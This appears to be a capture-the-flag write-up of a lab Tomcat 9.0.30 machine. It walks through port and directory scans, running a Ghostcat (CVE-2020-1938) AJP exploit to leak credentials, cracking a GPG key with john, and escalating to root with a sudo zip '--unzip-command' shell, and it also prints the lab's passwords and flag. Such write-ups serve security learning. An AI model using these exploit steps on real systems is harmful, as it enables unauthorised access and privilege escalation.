Quick port scan
```bash
nmap -p- --min-rate=10000 10.10.184.54                 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-23 15:05 EEST
Warning: 10.10.184.54 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.184.54
Host is up (0.25s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
8009/tcp open  ajp13
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 17.62 seconds
                                                                                                                    
┌──(kali㉿kali)-[~]
└─$ nmap -p 22,53,8009,8080 -sC -sV 10.10.184.54           
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-23 15:06 EEST
Nmap scan report for 10.10.184.54
Host is up (0.24s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
|_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http       Apache Tomcat 9.0.30
|_http-open-proxy: Proxy might be redirecting requests
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.30
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.94 seconds
```

```bash
gobuster dir -w /usr/share/wordlists/dirb/big.txt  -u http://10.10.184.54:8080/ -t 100        
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.184.54:8080/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/[                    (Status: 400) [Size: 762]
/]                    (Status: 400) [Size: 762]
/docs                 (Status: 302) [Size: 0] [--> /docs/]
/examples             (Status: 302) [Size: 0] [--> /examples/]
/favicon.ico          (Status: 200) [Size: 21630]
/manager              (Status: 302) [Size: 0] [--> /manager/]
/plain]               (Status: 400) [Size: 762]
/quote]               (Status: 400) [Size: 762]
Progress: 20469 / 20470 (100.00%)
```

I did some research for the Apache Tomcat/9.0.30 and there are multiple exploits that were patched in the next 9.0.31 update.

I found a CVE-2020-1938 which seemed like it could be of use. Lets try it.

```bash
python3 tomcat.py 10.10.184.54 -f /WEB-INF/web.xml       
Getting resource at ajp13://10.10.184.54:8009/hissec
----------------------------
<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to GhostCat
        skyfuck:8730281lkjlkjdqlksalks
  </description>

</web-app>
```

We were able to get credentials for smth? Possibly ssh. lets try them. Nice now we are in


I did a linpeas scan and didnt see anything interesting. But then i saw a gpg file and a key for it. i transfered them over with the scp and bruteforced the password for the key with gpg2john and john. The password for the key was alexandru.


```bash
 john --wordlist=/usr/share/wordlists/rockyou.txt hash     
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65536 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alexandru        (tryhackme)     
1g 0:00:00:00 DONE (2025-08-23 17:12) 33.33g/s 35733p/s 35733c/s 35733C/s theresa..alexandru
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

```bash
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11
      "tryhackme <stuxnet@tryhackme.com>"
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123jskyfuck@ubuntu:~$ 
```

I guess thats the password for merlin. thats quite an long password

```bash
merlin@ubuntu:/tmp$ sudo -l
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
```

The user merlin can use zip as root. We can use that to gain the root.txt

```bash
https://gtfobins.github.io/gtfobins/zip/
```
Basically I created a new file and zipped it and used the "--unzip-command" function of the zip to create a shell and since it ran as root we got the root shell and were able to get a root shell and complete the machine 

```bash
merlin@ubuntu:/tmp$ touch test.txt
merlin@ubuntu:/tmp$ sudo zip 1.zip test.txt -T --unzip-command="sh -c /bin/bash"
  adding: test.txt (stored 0%)
root@ubuntu:/tmp# cat /root/root.txt
THM{Z1P_1S_FAKE}
```
